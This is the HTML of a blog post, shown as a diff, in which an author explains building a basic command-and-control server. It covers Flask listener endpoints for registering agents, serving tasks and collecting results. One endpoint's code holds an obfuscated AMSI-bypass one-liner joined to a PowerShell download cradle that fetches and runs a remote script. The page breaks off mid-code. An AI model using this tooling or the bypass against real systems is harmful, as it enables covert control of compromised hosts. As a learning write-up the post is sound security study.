@@ -1,0 +1,1654 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Building a Basic C2 - 0xRick’s Blog</title>
+<meta name="description" content="In this post I talk about the approaches I took trying to build a basic C2.">
+
+
+  <meta name="author" content="0xRick">
+  
+  <meta property="article:author" content="0xRick">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en">
+<meta property="og:site_name" content="0xRick's Blog">
+<meta property="og:title" content="Building a Basic C2">
+<meta property="og:url" content="https://0xrick.github.io/misc/c2/">
+
+
+  <meta property="og:description" content="In this post I talk about the approaches I took trying to build a basic C2.">
+
+
+
+
+
+  <meta name="twitter:site" content="@ahm3d_h3sham">
+  <meta name="twitter:title" content="Building a Basic C2">
+  <meta name="twitter:description" content="In this post I talk about the approaches I took trying to build a basic C2.">
+  <meta name="twitter:url" content="https://0xrick.github.io/misc/c2/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2020-04-16T03:00:00+02:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://0xrick.github.io/misc/c2/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "0xRick",
+      "url": "https://0xrick.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          0xRick's Blog
+          
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags">Tags</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0xRick</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+ 
+  
+  </div>
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Building a Basic C2">
+    <meta itemprop="description" content="Introduction">
+    <meta itemprop="datePublished" content="2020-04-16T03:00:00+02:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="https://0xrick.github.io/misc/c2/" class="u-url" itemprop="url">Building a Basic C2
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-04-16T03:00:00+02:00">April 16, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          23 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        <div>
+          <style>
+              #carbonads {
+                border: 1px solid black;
+                border-radius: 7px;
+                border-spacing: 7px;
+                display: block;
+                overflow: hidden;
+                padding: 1em;
+                line-height: 1.5;
+              }
+              #carbonads span {
+                position: relative;
+                display: block;
+                overflow: hidden;
+              }
+              .carbon-img img {
+                display: block;
+                float: left;
+              }
+              .carbon-text {
+                display: block;
+                font-size: .9em;
+                text-align: end;
+              }
+              .carbon-poweredby {
+                display: block;
+                font-size: .8em;
+                float: right;
+                line-height: 1;
+                letter-spacing: 1px;
+                }
+                </style>
+                <br>   
+          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
+                <br>
+        </div>
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title">
+<i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+<li><a href="#introduction">Introduction</a></li>
+<li>
+<a href="#overview">Overview</a><ul>
+<li><a href="#about-c2-servers--agents">About c2 servers / agents</a></li>
+<li><a href="#about-the-tool">About the Tool</a></li>
+</ul>
+</li>
+<li>
+<a href="#listeners">Listeners</a><ul>
+<li><a href="#basic-info">Basic Info</a></li>
+<li>
+<a href="#the-flask-application">The Flask Application</a><ul>
+<li><a href="#reg">/reg</a></li>
+<li><a href="#tasksname">/tasks/&lt;name&gt;</a></li>
+<li><a href="#resultsname">/results/&lt;name&gt;</a></li>
+<li><a href="#downloadname">/download/&lt;name&gt;</a></li>
+<li><a href="#scname">/sc/&lt;name&gt;</a></li>
+</ul>
+</li>
+<li><a href="#starting-and-stopping">Starting and Stopping</a></li>
+</ul>
+</li>
+<li>
+<a href="#agents">Agents</a><ul>
+<li><a href="#basic-info-1">Basic Info</a></li>
+<li><a href="#powershell-agent">PowerShell Agent</a></li>
+<li><a href="#c-agent">C++ Agent</a></li>
+</ul>
+</li>
+<li><a href="#agent-handler">Agent Handler</a></li>
+<li>
+<a href="#payloads-generator">Payloads Generator</a><ul>
+<li><a href="#powershell">PowerShell</a></li>
+<li><a href="#windows-executable-c-agent">Windows Executable (C++ Agent)</a></li>
+</ul>
+</li>
+<li>
+<a href="#encryption">Encryption</a><ul>
+<li><a href="#server">Server</a></li>
+<li><a href="#powershell-agent-1">PowerShell Agent</a></li>
+</ul>
+</li>
+<li><a href="#listeners--agents-persistency">Listeners / Agents Persistency</a></li>
+<li><a href="#demo">Demo</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h2 id="introduction">Introduction</h2>
+
+<p>It’s very common that after successful exploitation an attacker would put an agent that maintains communication with a c2 server on the compromised system, and the reason for that is very simple, having an agent that provides persistency over large periods and almost all the capabilities an attacker would need to perform lateral movement and other post-exploitation actions is better than having a reverse shell for example. There are a lot of free open source post-exploitation toolsets that provide this kind of capability, like <a href="https://www.metasploit.com/" target="_blank" rel="noopener noreferrer">Metasploit</a>, <a href="https://www.powershellempire.com/" target="_blank" rel="noopener noreferrer">Empire</a> and many others, and even if you only play CTFs it’s most likely that you have used one of those before.<br></p>
+
+<p>Long story short, I only had a general idea about how these tools work and I wanted to understand the internals of them, so I decided to try and build one on my own. For the last three weeks, I have been searching and coding, and I came up with a very basic implementation of a c2 server and an agent. In this blog post I’m going to explain the approaches I took to build the different pieces of the tool.<br></p>
+
+<p>Please keep in mind that some of these approaches might not be the best and also the code might be kind of messy, If you have any suggestions for improvements feel free to contact me, I’d like to know what better approaches I could take. I also like to point out that this is not a tool to be used in real engagements, besides only doing basic actions like executing <code class="language-plaintext highlighter-rouge">cmd</code> and <code class="language-plaintext highlighter-rouge">powershell</code>, I didn’t take in consideration any opsec precautions.<br></p>
+
+<p>This tool is still a work in progress, I finished the base but I’m still going to add more execution methods and more capabilities to the agent. After adding new features I will keep writing posts similar to this one, so that people with more experience give feedback and suggest improvements, while people with less experience learn.<br></p>
+
+<p>You can find the tool on <a href="https://github.com/0xRick/c2" target="_blank" rel="noopener noreferrer">github</a>.<br></p>
+
+<h2 id="overview">Overview</h2>
+
+<h3 id="about-c2-servers--agents">About c2 servers / agents</h3>
+
+<p>As far as I know,</p>
+
+<p>A basic c2 server should be able to:</p>
+
+<ul>
+  <li>Start and stop listeners.</li>
+  <li>Generate payloads.</li>
+  <li>Handle agents and task them to do stuff.</li>
+</ul>
+
+<p>An agent should be able to:</p>
+
+<ul>
+  <li>Download and execute its tasks.</li>
+  <li>Send results.</li>
+  <li>Persist.</li>
+</ul>
+
+<p>A listener should be able to:</p>
+
+<ul>
+  <li>Handle multiple agents.</li>
+  <li>Host files.</li>
+</ul>
+
+<p>And all communications should be encrypted.<br></p>
+
+<h3 id="about-the-tool">About the Tool</h3>
+
+<p>The server itself is written in <code class="language-plaintext highlighter-rouge">python3</code>, I wrote two agents, one in <code class="language-plaintext highlighter-rouge">c++</code> and the other in <code class="language-plaintext highlighter-rouge">powershell</code>, listeners are <code class="language-plaintext highlighter-rouge">http</code> listeners.<br></p>
+
+<p>I couldn’t come up with a nice name so I would appreciate suggestions.<br></p>
+
+<h2 id="listeners">Listeners</h2>
+
+<h3 id="basic-info">Basic Info</h3>
+
+<p>Listeners are the core functionality of the server because they provide the way of communication between the server and the agents. I decided to use <code class="language-plaintext highlighter-rouge">http</code> listeners, and I used <code class="language-plaintext highlighter-rouge">flask</code> to create the listener application.<br></p>
+
+<p>A <code class="language-plaintext highlighter-rouge">Listener</code> object is instantiated with a name, a port and an <code class="language-plaintext highlighter-rouge">IP</code> address to bind to:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Listener</span><span class="p">:</span>    
+
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ipaddress</span><span class="p">):</span>
+        
+        <span class="bp">self</span><span class="p">.</span><span class="n">name</span>       <span class="o">=</span> <span class="n">name</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">port</span>       <span class="o">=</span> <span class="n">port</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">ipaddress</span>  <span class="o">=</span> <span class="n">ipaddress</span>
+        <span class="p">...</span>
+</code></pre></div></div>
+
+<p>Then it creates the needed directories to store files, and other data like the encryption key and agents’ data:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>	
+    	
+<span class="bp">self</span><span class="p">.</span><span class="n">Path</span>       <span class="o">=</span> <span class="s">"data/listeners/{}/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">keyPath</span>    <span class="o">=</span> <span class="s">"{}key"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">filePath</span>   <span class="o">=</span> <span class="s">"{}files/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+<span class="bp">self</span><span class="p">.</span><span class="n">agentsPath</span> <span class="o">=</span> <span class="s">"{}agents/"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+        
+<span class="p">...</span>
+        
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">Path</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">agentsPath</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">agentsPath</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">filePath</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">mkdir</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">filePath</span><span class="p">)</span>
+
+<span class="p">...</span>
+</code></pre></div></div>
+
+<p>After that it creates a key, saves it and stores it in a variable (more on <code class="language-plaintext highlighter-rouge">generateKey()</code> in the encryption part):</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
+    
+<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">keyPath</span><span class="p">)</span> <span class="o">==</span> <span class="bp">False</span><span class="p">:</span>
+    
+    <span class="n">key</span>      <span class="o">=</span> <span class="n">generateKey</span><span class="p">()</span>
+    <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">key</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">keyPath</span><span class="p">,</span> <span class="s">"wt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">keyPath</span><span class="p">,</span> <span class="s">"rt"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            
+<span class="p">...</span>
+</code></pre></div></div>
+
+<h3 id="the-flask-application">The Flask Application</h3>
+
+<p>The flask application which provides all the functionality of the listener has 5 routes: <code class="language-plaintext highlighter-rouge">/reg</code>, <code class="language-plaintext highlighter-rouge">/tasks/&lt;name&gt;</code>, <code class="language-plaintext highlighter-rouge">/results/&lt;name&gt;</code>, <code class="language-plaintext highlighter-rouge">/download/&lt;name&gt;</code>, <code class="language-plaintext highlighter-rouge">/sc/&lt;name&gt;</code>.<br></p>
+
+<h4 id="reg"><code class="language-plaintext highlighter-rouge">/reg</code></h4>
+
+<p><code class="language-plaintext highlighter-rouge">/reg</code> is responsible for handling new agents, it only accepts <code class="language-plaintext highlighter-rouge">POST</code> requests and it takes two parameters: <code class="language-plaintext highlighter-rouge">name</code> and <code class="language-plaintext highlighter-rouge">type</code>. <code class="language-plaintext highlighter-rouge">name</code> is for the <code class="language-plaintext highlighter-rouge">hostname</code> while  <code class="language-plaintext highlighter-rouge">type</code> is for the agent’s type.<br></p>
+
+<p>When it receives a new request it creates a random string of 6 uppercase letters as the new agent’s name (that name can be changed later), then it takes the <code class="language-plaintext highlighter-rouge">hostname</code> and the agent’s type from the request parameters. It also saves the remote address of the request which is the <code class="language-plaintext highlighter-rouge">IP</code> address of the compromised host.<br></p>
+
+<p>With these information it creates a new <code class="language-plaintext highlighter-rouge">Agent</code> object and saves it to the agents database, and finally it responds with the generated random name so that the agent on the other side can know its name.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/reg"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">registerAgent</span><span class="p">():</span>
+    <span class="n">name</span>     <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">choice</span><span class="p">(</span><span class="n">ascii_uppercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
+    <span class="n">remoteip</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span>
+    <span class="n">hostname</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"name"</span><span class="p">)</span>
+    <span class="n">Type</span>     <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"type"</span><span class="p">)</span>
+    <span class="n">success</span><span class="p">(</span><span class="s">"Agent {} checked in."</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
+    <span class="n">writeToDatabase</span><span class="p">(</span><span class="n">agentsDB</span><span class="p">,</span> <span class="n">Agent</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">remoteip</span><span class="p">,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">Type</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">))</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="tasksname"><code class="language-plaintext highlighter-rouge">/tasks/&lt;name&gt;</code></h4>
+
+<p><code class="language-plaintext highlighter-rouge">/tasks/&lt;name&gt;</code> is the endpoint that agents request to download their tasks, <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code class="language-plaintext highlighter-rouge">GET</code> requests.<br></p>
+
+<p>It simply checks if there are new tasks (by checking if the tasks file exists), if there are new tasks it responds with the tasks, otherwise it sends an empty response (<code class="language-plaintext highlighter-rouge">204</code>).<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/tasks/&lt;name&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">serveTasks</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="s">"{}/{}/tasks"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">agentsPath</span><span class="p">,</span> <span class="n">name</span><span class="p">)):</span>
+        
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}{}/tasks"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">agentsPath</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+            <span class="n">task</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            <span class="n">clearAgentTasks</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+        
+        <span class="k">return</span><span class="p">(</span><span class="n">task</span><span class="p">,</span><span class="mi">200</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="s">''</span><span class="p">,</span><span class="mi">204</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="resultsname"><code class="language-plaintext highlighter-rouge">/results/&lt;name&gt;</code></h4>
+
+<p><code class="language-plaintext highlighter-rouge">/results/&lt;name&gt;</code> is the endpoint that agents request to send results, <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a placeholder for the agent’s name, it only accepts <code class="language-plaintext highlighter-rouge">POST</code> requests and it takes one parameter: <code class="language-plaintext highlighter-rouge">result</code> for the results.<br></p>
+
+<p>It takes the results and sends them to a function called <code class="language-plaintext highlighter-rouge">displayResults()</code> (more on that function in the agent handler part), then it sends an empty response <code class="language-plaintext highlighter-rouge">204</code>.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/results/&lt;name&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">receiveResults</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"result"</span><span class="p">)</span>
+    <span class="n">displayResults</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">result</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="s">''</span><span class="p">,</span><span class="mi">204</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="downloadname"><code class="language-plaintext highlighter-rouge">/download/&lt;name&gt;</code></h4>
+
+<p><code class="language-plaintext highlighter-rouge">/download/&lt;name&gt;</code> is responsible for downloading files, <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a placeholder for the file name, it only accepts <code class="language-plaintext highlighter-rouge">GET</code> requests.<br></p>
+
+<p>It reads the requested file from the files path and it sends it.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/download/&lt;name&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">sendFile</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">f</span>    <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"{}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">filePath</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="s">"rt"</span><span class="p">)</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+            
+    <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h4 id="scname"><code class="language-plaintext highlighter-rouge">/sc/&lt;name&gt;</code></h4>
+
+<p><code class="language-plaintext highlighter-rouge">/sc/&lt;name&gt;</code> is just a wrapper around the <code class="language-plaintext highlighter-rouge">/download/&lt;name&gt;</code> endpoint for <code class="language-plaintext highlighter-rouge">powershell</code> scripts, it responds with a download cradle prepended with a oneliner to bypass <code class="language-plaintext highlighter-rouge">AMSI</code>, the oneliner downloads the original script from <code class="language-plaintext highlighter-rouge">/download/&lt;name&gt;</code> ,  <code class="language-plaintext highlighter-rouge">&lt;name&gt;</code> is a placeholder for the script name, it only accepts <code class="language-plaintext highlighter-rouge">GET</code> requests.<br></p>
+
+<p>It takes the script name, creates a download cradle in the following format:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://IP:PORT/download/SCRIPT_NAME'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<p>and prepends that with the oneliner and responds with the full line.<br></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="bp">self</span><span class="p">.</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/sc/&lt;name&gt;"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">sendScript</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+    <span class="n">amsi</span>     <span class="o">=</span> <span class="s">"sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](</span><span class="se">\"</span><span class="s">{1}{0}</span><span class="se">\"</span><span class="s">-F'F','rE' ) ) ; ( GeT-VariaBle ( </span><span class="se">\"</span><span class="s">1Q2U</span><span class="se">\"</span><span class="s"> +</span><span class="se">\"</span><span class="s">zX</span><span class="se">\"</span><span class="s"> ) -VaL).</span><span class="se">\"</span><span class="s">A`ss`Embly</span><span class="se">\"</span><span class="s">.</span><span class="se">\"</span><span class="s">GET`TY`Pe</span><span class="se">\"</span><span class="s">(( </span><span class="se">\"</span><span class="s">{6}{3}{1}{4}{2}{0}{5}</span><span class="se">\"</span><span class="s"> -f'Util','A','Amsi','.Management.','utomation.','s','System' )).</span><span class="se">\"</span><span class="s">g`etf`iElD</span><span class="se">\"</span><span class="s">( ( </span><span class="se">\"</span><span class="s">{0}{2}{1}</span><span class="se">\"</span><span class="s"> -f'amsi','d','InitFaile' ),(</span><span class="se">\"</span><span class="s">{2}{4}{0}{1}{3}</span><span class="se">\"</span><span class="s"> -f 'Stat','i','NonPubli','c','c,' )).</span><span class="se">\"</span><span class="s">sE`T`VaLUE</span><span class="se">\"</span><span class="s">(${n`ULl},${t`RuE} ); "</span>
+    <span class="n">oneliner</span> <span class="o">=</span> <span class="s">"{}IEX(New-Object Net.WebClient).DownloadString(</span><span class="se">\'</span><span class="s">http://{}:{}/download/{}</span><span class="se">\'</span><span class="s">)"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">amsi</span><span class="p">,</span><span class="bp">self</span><span class="p">.</span><span class="n">ipaddress</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">port</span><span class="p">),</span><span class="n">name</span><span class="p">)</span>
+    
